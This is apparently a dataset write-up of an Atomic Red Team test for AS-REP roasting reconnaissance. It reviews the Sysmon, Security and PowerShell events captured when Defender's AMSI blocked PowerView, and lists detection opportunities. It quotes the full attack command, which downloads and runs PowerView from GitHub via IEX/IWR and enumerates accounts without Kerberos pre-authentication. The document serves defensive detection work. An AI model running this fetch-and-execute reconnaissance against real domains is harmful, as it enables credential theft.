# T1558.004-2: AS-REP Roasting — Get-DomainUser with PowerView

## Technique Context

AS-REP Roasting (T1558.004) requires first identifying which domain accounts have Kerberos pre-authentication disabled. PowerView, part of the PowerSploit framework, provides `Get-DomainUser -PreauthNotRequired` to enumerate exactly those accounts via LDAP. This test downloads PowerView directly from the PowerSploit repository and calls `Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose` to enumerate vulnerable accounts. This is a reconnaissance step in the AS-REP roasting attack chain — identifying targets before requesting their AS-REP hashes.

## What This Dataset Contains

The dataset spans approximately 6 seconds on 2026-03-14 from ACME-WS02 (acme.local domain) and contains 86 events across Sysmon, Security, and PowerShell channels.

**The attack command**, captured in Security 4688:
```
powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose}
```

**Defender blocked PowerView.** The PowerView script was blocked by AMSI when evaluated via `IEX`. PowerView function calls (`Get-DomainUser`) did not execute. No 4100 error event was captured in the bundled PowerShell events (the error ID was not included in the collection filter), but the absence of any PowerView function output or LDAP activity confirms the block.

**Sysmon Event 8 (CreateRemoteThread)** is notable: one event was captured showing PowerShell (PID 2780) creating a remote thread in an unknown target process (PID 5924, `<unknown process>`). This likely reflects Defender's own analysis process examining the PowerShell execution — it is not a sign of successful injection by the attack.

**Process chain** (Security 4688 and Sysmon 1):
1. `whoami.exe` — ART test framework pre-check (T1033)
2. `powershell.exe` — downloading and executing PowerView

**Sysmon events include:**
- Event 1: `whoami.exe` (T1033)
- Event 7: .NET CLR image loads into PowerShell
- Event 8 (CreateRemoteThread): PowerShell → unknown process, tagged `T1055/Process Injection`
- Event 10: PowerShell accessing child processes (T1055.001 pattern)
- Event 11: PowerShell startup profile data files
- Event 17: `\PSHost.*` named pipes

**PowerShell 4103** captures `Set-ExecutionPolicy -Scope Process -Force -ExecutionPolicy Bypass` (ART test framework setup).

**PowerShell 4104** contains only module boilerplate fragments — PowerView's script bodies were not logged in 4104 because AMSI blocked the content before the script blocks could be fully formed and logged.

## What This Dataset Does Not Contain (and Why)

**No PowerView function output.** AMSI blocked the PowerView script before `Get-DomainUser` could execute. No LDAP queries were made to the DC.

**No AS-REP vulnerable account enumeration results.** This test was purely reconnaissance; even if it had succeeded, account names would appear in stdout but not in the Windows event logs captured here.

**No Kerberos events.** This test does not request tickets — it only identifies potential targets. Security 4769 or 4768 events are not expected.

**No PowerView script block content in 4104.** The AMSI block prevented the script from being compiled, so the 4104 events do not contain PowerView function definitions or the `Get-DomainUser` call.

## Assessment

Defender's AMSI integration blocked PowerView at the script evaluation stage, consistent with its coverage of the PowerSploit framework. The dataset captures the full attack command including the specific PowerSploit commit hash, the `PreauthNotRequired` filter, and the `distinguishedname` property request — all unambiguous AS-REP roasting reconnaissance indicators. The Sysmon Event 8 (CreateRemoteThread) is an unusual element that may warrant further investigation in production, though in this context it reflects Defender's analysis activity rather than successful injection.

## Detection Opportunities Present in This Data

- **Security 4688 / Sysmon 1**: `powershell.exe` command line with `IEX (IWR ...)` downloading `PowerView.ps1` from PowerSploit — URL, framework name, and function are clear indicators
- **Security 4688**: Full command includes `Get-DomainUser -PreauthNotRequired` — querying for accounts with pre-auth disabled is a direct AS-REP roasting indicator
- **Sysmon 8 (CreateRemoteThread)**: PowerShell creating a thread in an unknown process — tagged `T1055/Process Injection` by sysmon-modular, worth investigation in context
- **PowerShell 4103**: `Set-ExecutionPolicy Bypass -Scope Process` immediately preceding the download-and-execute — standard test framework setup but also a real attacker pattern
- **Behavioral**: `IEX` receiving content from `IWR` against a raw.githubusercontent.com URL referencing a known offensive repository is detectable independent of the payload content
